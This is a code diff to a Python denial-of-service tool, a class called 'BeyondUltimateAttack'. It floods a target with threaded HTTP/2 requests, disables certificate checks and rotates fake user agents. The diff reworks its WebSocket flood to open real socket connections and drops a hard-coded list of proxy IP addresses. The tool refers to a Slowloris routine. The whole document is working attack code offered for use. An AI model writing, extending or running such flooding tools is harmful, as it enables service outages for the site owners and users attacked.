@@ -1,20 +1,15 @@
 import random
 import requests
-from fake_useragent import UserAgent
 import threading
 import httpx
+import websocket
+from fake_useragent import UserAgent
 
 class BeyondUltimateAttack:
     def __init__(self, target):
         self.target = target
-        self.proxies = [
-            'http://1.10.186.107:13629',
-            'http://101.200.187.233:3333',
-            'http://1.32.59.217:47045'
-        ]
         self.ua = UserAgent()
-        self.max_threads = 100  
-        self.http_client = httpx.Client(http2=True, verify=False)  
+        self.http_client = httpx.Client(http2=True, verify=False)
 
     def get_random_user_agent(self):
         return self.ua.random
@@ -55,17 +50,22 @@ class BeyondUltimateAttack:
             print(f"Slowloris Failed: {str(e)}")
 
     def websocket_flood(self):
-        headers = self.generate_headers()
-        ws_url = self.target.replace("http", "ws")  
+        ws_url = self.target.replace("http", "ws")
+        if not ws_url.startswith("ws://") and not ws_url.startswith("wss://"):
+            print(f"WebSocket Attack Skipped: Target {self.target} is not a WebSocket server.")
+            return
+
         try:
-            response = requests.get(ws_url, headers=headers, timeout=10)
-            print(f"WebSocket Attack Sent: {response.status_code}")
+            ws = websocket.create_connection(ws_url, timeout=5)
+            ws.send("FLOOD")
+            ws.close()
+            print(f"WebSocket Attack Sent: {ws_url}")
         except Exception as e:
             print(f"WebSocket Attack Failed: {str(e)}")
 
     def attack(self):
         threads = []
-        for _ in range(self.max_threads):
+        for _ in range(100):
             t = threading.Thread(target=self.send_http2_flood)
             threads.append(t)
             t.start()
